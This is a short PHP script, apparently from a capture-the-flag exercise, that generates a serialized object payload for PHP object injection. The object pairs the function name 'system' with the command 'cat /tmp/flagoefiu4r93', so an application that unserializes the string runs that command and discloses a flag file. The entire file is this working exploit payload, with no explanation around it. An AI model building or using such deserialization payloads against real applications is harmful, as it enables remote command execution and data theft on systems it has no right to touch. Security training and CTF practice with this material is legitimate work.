<?php
class Test {
    var $p = "cat /tmp/flagoefiu4r93";
    var $func = "system";
}

$a=new Test();
echo serialize($a);
?>
